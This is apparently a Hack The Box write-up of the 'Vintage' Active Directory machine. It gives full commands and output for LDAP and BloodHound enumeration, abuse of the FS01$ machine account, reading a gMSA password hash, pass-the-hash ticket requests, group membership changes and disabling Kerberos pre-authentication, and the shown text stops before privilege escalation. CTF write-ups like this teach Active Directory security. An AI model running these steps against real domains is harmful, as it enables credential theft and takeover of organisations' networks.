---
layaout: post
image: /assets/vintage/vintage.png
title: Vintage Write Up HTB
date: 27-04-2025
categories: [Write ups]
tag: [Windows, Active Directory, Privilege Escalation, Kerberos Attacks, DPAPI, BloodHound, Hard Difficulty]
excerpt: "Vintage on Hack The Box is a hard-difficulty Windows machine centered around exploiting vulnerabilities in an Active Directory environment and leveraging misconfigurations in certificate services. The initial foothold consists of obtaining a TGT ticket through Impacket and thus obtaining tickets from different users.Privilege escalation consists of violating a DPAPI and using a masterkey to exploit it to obtain different TGT tickets.

This machine is ideal for experts users looking to enhance their skills in Active Directory exploitation, certificate-based attacks, post-exploitation techniques in Windows environments and learn how TGT tickets work."
---
![img-description](/assets/vintage/vintage.png)

Vintage on Hack The Box is a hard-difficulty Windows machine centered around exploiting vulnerabilities in an Active Directory environment and leveraging misconfigurations in certificate services. The initial foothold consists of obtaining a TGT ticket through Impacket and thus obtaining tickets from different users.Privilege escalation consists of violating a DPAPI and using a masterkey to exploit it to obtain different TGT tickets.

This machine is ideal for experts users looking to enhance their skills in Active Directory exploitation, certificate-based attacks, post-exploitation techniques in Windows environments and learn how TGT tickets work.

## ENUMERATION
---
### NMAP SCAN
---

First we run nmap as usual to see the open ports

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.45 -oG allPorts
```

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.45 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 15:42 CET
Initiating SYN Stealth Scan at 15:42
Scanning 10.10.11.45 [65535 ports]
Discovered open port 139/tcp on 10.10.11.45
Discovered open port 445/tcp on 10.10.11.45
Discovered open port 53/tcp on 10.10.11.45
Discovered open port 135/tcp on 10.10.11.45
Discovered open port 55961/tcp on 10.10.11.45
Discovered open port 55966/tcp on 10.10.11.45
Discovered open port 593/tcp on 10.10.11.45
Discovered open port 49664/tcp on 10.10.11.45
Discovered open port 636/tcp on 10.10.11.45
Discovered open port 3269/tcp on 10.10.11.45
Discovered open port 49674/tcp on 10.10.11.45
Discovered open port 9389/tcp on 10.10.11.45
Discovered open port 3268/tcp on 10.10.11.45
Discovered open port 55984/tcp on 10.10.11.45
Discovered open port 5985/tcp on 10.10.11.45
Discovered open port 88/tcp on 10.10.11.45
Discovered open port 60916/tcp on 10.10.11.45
Discovered open port 389/tcp on 10.10.11.45
Discovered open port 49667/tcp on 10.10.11.45
Discovered open port 464/tcp on 10.10.11.45
Completed SYN Stealth Scan at 15:42, 26.38s elapsed (65535 total ports)
Nmap scan report for 10.10.11.45
Host is up, received user-set (0.043s latency).
Scanned at 2025-03-06 15:42:16 CET for 26s
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
55961/tcp open  unknown          syn-ack ttl 127
55966/tcp open  unknown          syn-ack ttl 127
55984/tcp open  unknown          syn-ack ttl 127
60916/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.45 seconds
           Raw packets sent: 131065 (5.767MB) | Rcvd: 35 (1.540KB)

```

Y vemos muchos puertos abiertos , ahora realizaremos un escaneo de vulnerabilidades de todos estos puertos con el siguiente comando

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49674,55961,55966,55984,60916 --open -sCV 10.10.11.45 -oN targeted
```

```bash
❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49674,55961,55966,55984,60916 --open -sCV 10.10.11.45 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 15:47 CET
Nmap scan report for fs01.vintage.htb (10.10.11.45)
Host is up (0.043s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-06 14:47:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
55961/tcp open  msrpc         Microsoft Windows RPC
55966/tcp open  msrpc         Microsoft Windows RPC
55984/tcp open  msrpc         Microsoft Windows RPC
60916/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-06T14:48:45
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.22 seconds
```

As we see by running the previous command that contains the most popular vulnerabilities, we have managed to extract the domain of the machine, which is `DC01.vintage.htb` since **Host** = `DC01` and **Domain** = `vintage.htb` and we add it to `/etc/hosts` along with its **IP**, with the following command

```bash
sudo vim /etc/hosts
```

### LDAPSEARCH
---
Now we use ldapsearch to see what users exist on the machine. To do this, we execute the following:

```bash
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName memberOf
```

This command is used to perform a search on an **LDAP (Lightweight Directory Access Protocol)** server. Below I explain each part of the command:

1. **ldapsearch**

This is the tool used to search for information in an LDAP directory. This command allows you to interact with an LDAP server and perform searches based on certain criteria.

2. **-x**

This is the parameter that indicates that a simple bind (simple authentication) should be used. By default, LDAP uses SASL (Simple Authentication and Security Layer) authentication, but with -x you specify that SASL will not be used, but rather a simpler authentication, such as providing a username and password.
3. **-H ldap://10.10.11.45**

Here you are specifying the host (server) to which you are connecting. In this case, it is an LDAP server at the IP address 10.10.11.45.

ldap:// indicates that you are connecting via the LDAP protocol instead of LDAPS (which would be over SSL/TLS).
10.10.11.45 is the IP address of the LDAP server.

4. **-D "P.Rosa@vintage.htb"**

This parameter indicates the DN (Distinguished Name) or name of the user to use to authenticate. In this case, the user is "P.Rosa@vintage.htb", which suggests that you are authenticating as this user on the LDAP server.

- `-D` specifies the DN of the user.
- `"P.Rosa@vintage.htb"` is the username you are performing the search with.

5. **-w "Rosaisbest123"**

This is the parameter used to provide the password for the user specified in -D. In this case, the password is "Rosaisbest123".

- `-w` indicates that you are providing a password.
- `"Rosaisbest123"` is the password associated with the user P.Rosa@vintage.htb.

6. **-b "DC=vintage,DC=htb"**

This is the base DN (starting point in the LDAP hierarchy) from which the search will be performed.

- `-b` indicates the base point from which the search will begin in the LDAP tree.
- `"DC=vintage,DC=htb"` defines the domain. The search is being done within the domain vintage.htb, where DC stands for Domain Component.

In this case, the search is being limited to entries that belong to the domain vintage.htb.
7. **"(objectClass=user)"**

This is the search filter that is being used to search only those objects whose class is user.

- `(objectClass=user)` is the LDAP filter that is looking for entries that have the object class user. This means that only results representing users will be returned (and not other objects in the directory such as groups, computers, etc.).

8. **sAMAccountName memberOf**

These are the attributes that you want to retrieve from the objects that match the filter.

- `sAMAccountName`: This attribute represents the user's logon name (i.e. the name with which users log on to a Windows or Active Directory system).

- `memberOf`: This attribute represents the groups to which the user belongs. It is a list of the DNs of the groups of which the user is a member.

```bash
❯ ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName memberOf
# extended LDIF
#
# LDAPv3
# base <DC=vintage,DC=htb> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName memberOf 
#

# Administrator, Users, vintage.htb
dn: CN=Administrator,CN=Users,DC=vintage,DC=htb
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Administrator

# Guest, Users, vintage.htb
dn: CN=Guest,CN=Users,DC=vintage,DC=htb
memberOf: CN=Guests,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Guest

# DC01, Domain Controllers, vintage.htb
dn: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
sAMAccountName: DC01$

# krbtgt, Users, vintage.htb
dn: CN=krbtgt,CN=Users,DC=vintage,DC=htb
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
sAMAccountName: krbtgt

# gMSA01, Managed Service Accounts, vintage.htb
dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
sAMAccountName: gMSA01$

# fs01, Computers, vintage.htb
dn: CN=fs01,CN=Computers,DC=vintage,DC=htb
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: FS01$

# M.Rossi, Users, vintage.htb
dn: CN=M.Rossi,CN=Users,DC=vintage,DC=htb
sAMAccountName: M.Rossi

# R.Verdi, Users, vintage.htb
dn: CN=R.Verdi,CN=Users,DC=vintage,DC=htb
sAMAccountName: R.Verdi

# L.Bianchi, Users, vintage.htb
dn: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: L.Bianchi

# G.Viola, Users, vintage.htb
dn: CN=G.Viola,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: G.Viola

# C.Neri, Users, vintage.htb
dn: CN=C.Neri,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri

# P.Rosa, Users, vintage.htb
dn: CN=P.Rosa,CN=Users,DC=vintage,DC=htb
sAMAccountName: P.Rosa

# svc_sql, Pre-Migration, vintage.htb
dn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_sql

# svc_ldap, Pre-Migration, vintage.htb
dn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ldap

# svc_ark, Pre-Migration, vintage.htb
dn: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ark

# C.Neri_adm, Users, vintage.htb
dn: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri_adm

# L.Bianchi_adm, Users, vintage.htb
dn: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
sAMAccountName: L.Bianchi_adm

# search reference
ref: ldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 21
# numEntries: 17
# numReferences: 3
```

Now we can see that in the section `fs01 , Computers , vintage.htb` there is a new **Host** which is `FS01` so we add it to `/etc/hosts` as `FS01.vintage.htb` to do this we execute

```bash
sudo vim /etc/hosts
```

IMP: That is on the same line as the other domain, that is, in this way

![[Screenshot 2025-03-06 162106.jpg]]

Once we have added the other domain we need to configure the `/etc/resolv.conf` for this we do the following

```bash
sudo vim /etc/resolv.conf
```

We comment on our IP and add `nameserver 10.10.11.45` after making the machine you delete what you just added and remove the # from your IP, my ip is `name server 100.100.100.100`

```bash
# resolv.conf(5) file generated by tailscale
# For more info, see https://tailscale.com/s/resolvconf-overwrite
# DO NOT EDIT THIS FILE BY HAND -- CHANGES WILL BE OVERWRITTEN

#nameserver 100.100.100.100 
search tail0b24dd.ts.net localdomain
nameserver 10.10.11.45
```
 
Now we proceed to synchronize the time of our machine with the vintage machine. To do this, we execute the following command:

```bash
sudo ntpdate dc01.vintage.htb
```

```bash
❯ sudo ntpdate dc01.vintage.htb
2025-03-06 16:25:19.911879 (+0100) +0.376916 +/- 0.021604 dc01.vintage.htb 10.10.11.45 s1 no-leap
```
### BLOODHOUND 
---
Now we proceed to perform an analysis with bloodhound, we use the password and the username that it gives us and we execute the following

```bash
bloodhound-python -u P.Rosa -p 'Rosaisbest123' -d vintage.htb -c All -dc dc01.vintage.htb
```

This `bloodhound-python` command is used to gather information about an **Active Directory domain**, which can then be analyzed using **BloodHound**. `BloodHound` is a tool used by pentesters and system administrators to map and analyze relationships in an **Active Directory environment, identifying potential attack paths or privilege escalation.**

1. **bloodhound-python**

This is the **BloodHound** Python client used to collect data from an **Active Directory** domain. There are different ways to interact with **BloodHound** (for example, a C# version called **SharpHound**), but in this case, the Python client is being used.

`BloodHound` gathers information about the relationships between users, computers, groups, privileges, and policies within an **Active Directory** environment.

2. **-u P.Rosa**

This is the parameter that specifies the username to use to authenticate to the Active Directory domain.

- -u defines the user.
- P.Rosa is the username used to authenticate.

3. **-p 'Rosaisbest123'**

This is the parameter that defines the password for the specified user.

- -p defines the password.
- 'Rosaisbest123' is the password for the user P.Rosa.

4. **-d vintage.htb**

This parameter specifies the domain on which the data collection is to be performed. Here, the domain is vintage.htb.

- -d defines the domain you are operating on.
- vintage.htb is the name of the Active Directory domain.

5. **-c All**

This parameter indicates what types of data are to be collected. In this case, All means that all available data is to be collected.

BloodHound has several types of data collections it can perform, such as:

- Group: Groups and user membership relationships.
- ACL: Access control lists (allows you to analyze delegations of permissions).
- Sessions: User sessions on systems.
- Trusts: Trust relationships between domains.
- LocalAdmin: Who has local administrator privileges on specific systems.

By using -c All, you are indicating that you want to collect all types of data that BloodHound can obtain, which can include information about groups, user sessions, permissions, ACLs, etc.

6. **-dc dc01.vintage.htb**

This parameter indicates the specific Domain Controller from which you want to collect information. A Domain Controller is a server in an Active Directory network that responds to authentication and authorization requests, and stores information about objects on the network.

- `-dc` defines the name of the Domain Controller.
- `dc01.vintage.htb` is the name of the Domain Controller within the `vintage.htb` domain.

Command Summary:

This command uses the BloodHound Python client to collect all available data for the vintage.htb domain from the dc01.vintage.htb domain controller, authenticating as the user P.Rosa with the password 'Rosaisbest123'.

BloodHound will collect data on user relationships, groups, permissions, sessions, among others, which will then allow for the analysis of possible privilege escalation paths or attack vectors within the Active Directory environment.

```bash
❯ bloodhound-python -u P.Rosa -p 'Rosaisbest123' -d vintage.htb -c All -dc dc01.vintage.htb
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The resolution lifetime expired after 3.101 seconds: Server Do53:10.10.11.45@53 answered The DNS operation timed out.
INFO: Done in 00M 09S
```

And now in the route where we have executed the previous command we find the following

![[Screenshot 2025-03-06 165056.jpg]]

Thanks to this we can start the `BloodHound` and analyze the machine in more depth. To do this we first need to start the `BloodHound` database which is `neo4j`. To start it we run this

```bash
❯ sudo neo4j console
```

Once the database is started we can start the `BloodHound` without problems. We run this and proceed to analyze it in depth.

```bash
BloodHound
```

Once inside we import the data in the top right corner, we look for the section that says `Upload Data` and select all the **.json** files. Now we start the analysis. We will focus on the user `L.BIANCHI_ADM`.

---
![[Screenshot 2025-03-06 170734.jpg]]
Here we can see that the user L.BIANCHI_ADM@vintage.htb is a member of the **DOMAIN ADMINS** group, meaning he has administrator privileges.

---
![[Screenshot 2025-03-06 171255.jpg]]

And that GMSA01$@VINTAGE.HTB can be added to the **DOMAINS ADMINS** group

---
![[Screenshot 2025-03-07 125255.jpg]]

Groups that have control or elevated privileges over the account `GMSA01$@VINTAGE.HTB`

---
![[Screenshot 2025-03-07 125634.jpg]]

From FS01 to GMSA01, we can see that FS01 can read GMS's password

The GMS can then be added to the Administrators group.

## FOOTHOLD
---
We use `impacket-getTGT`: we provide password, hash or aeskey to request TGT and save it in ccache format

```bash
❯ impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01
```

```bash
❯ impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in FS01$.ccache
```

Once we have the `.ccache` we set the environment variable **KRB5CCNAME** to FS01\$.ccache to specify the cache file that the Kerberos client should use.

```bash
export KRB5CCNAME=FS01\$.ccache
```

Once the `.ccache` file has been exported, we use **bloodyAD** to interact with **Active Directory**, through Kerberos authentication, to obtain the password for the managed service account named `GMSA01$` (stored in the msDS-ManagedPassword attribute) from the specified **Active Directory** domain controller

```bash
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword
```

```bash
❯ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:51434c5b357ff89c5f85d994a27f7339
msDS-ManagedPassword.B64ENCODED: qNZ+qlGD+Cx17DM27SffmeF+2eftJRLCsHfxsLxSzhh2dERzgKmiJzvEHrfEAqstlS64r4Y1OQdu8sdCT6b8+gYXpLDa8xBQIFyshNK7YPrERV3rJVALnhITHE4lKIYoagI4Dr9owAMBGo7ZC4LOoBGk90mk4uuIMHNtylVRWva41F+v2TFCzSNfKnBSVuLhiZ+koEMTCkgP3Z+4Xnnluw6qkD3WPsnsYDlYYizOGPhsUwB1GJyzFHawe4iwfVnbWQdouCgflR27treFO5W0R5RqcRhkwEYLomOobFVUa3kGh1iQNdpaJLPI6Uo4767UM1O/sSaeML8nKVKhwsDolA==
```

Thanks to this we use it to get a Kerberos ticket from the **Active Directory** domain controller using a known GMSA account hash

```bash
impacket-getTGT vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:51434c5b357ff89c5f85d994a27f7339
```

```bash
❯ impacket-getTGT vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:51434c5b357ff89c5f85d994a27f7339
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in GMSA01$.ccache
```

And we export it again

```bash
export KRB5CCNAME=GMSA01\$.ccache
```

Then we add **P.Rosa** to **SERVICEMANAGERS**, use the credentials from **GMSA** and then generate our own credentials as follows

```bash
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add groupMember "SERVICEMANAGERS" "P.Rosa"
```

```bash
❯ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add groupMember "SERVICEMANAGERS" "P.Rosa"
[+] P.Rosa added to SERVICEMANAGERS
```

With this command we change the password
```bash
impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb
```

```bash
❯ impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in P.Rosa.ccache
```

And we export again for Kerberos to use

```bash
export KRB5CCNAME=P.Rosa.ccache 
```

We are trying to use this ticket to list the users that do not need Kerberos realm authentication, we first generate a list of usernames of the users in the domain with the following command

```bash
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt   
```

```bash
❯ ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt
❯ cat usernames.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: usernames.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Administrator
   2   │ Guest
   3   │ DC01$
   4   │ krbtgt
   5   │ gMSA01$
   6   │ FS01$
   7   │ M.Rossi
   8   │ R.Verdi
   9   │ L.Bianchi
  10   │ G.Viola
  11   │ C.Neri
  12   │ P.Rosa
  13   │ svc_sql
  14   │ svc_ldap
  15   │ svc_ark
  16   │ C.Neri_adm
  17   │ L.Bianchi_adm
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We then use `impacket-GetNPUsers` to list users that do not require Kerberos realm authentication (UF_DONT_REQUIRE_PREAUTH)

```bash
impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
```

```bash
❯ impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User svc_ldap doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_ark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Next, we disable pre-authentication

```bash
❯ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_ARK's userAccountControl
❯ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_LDAP's userAccountControl
❯ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_SQL's userAccountControl
```

COMMANDS:

```bash
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH
```

```bash
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH
```

```bash
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
```


We enable the account as follows

```bash
❯ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_ARK -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_ARK's userAccountControl
❯ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_LDAP -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_LDAP's userAccountControl
❯ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl
```

COMMANDS:

```bash
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_ARK -f ACCOUNTDISABLE
```

```bash
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_LDAP -f ACCOUNTDISABLE
```

```bash
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
```


We verify the domain user again with the following command

```bash
impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
```

```bash
❯ impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
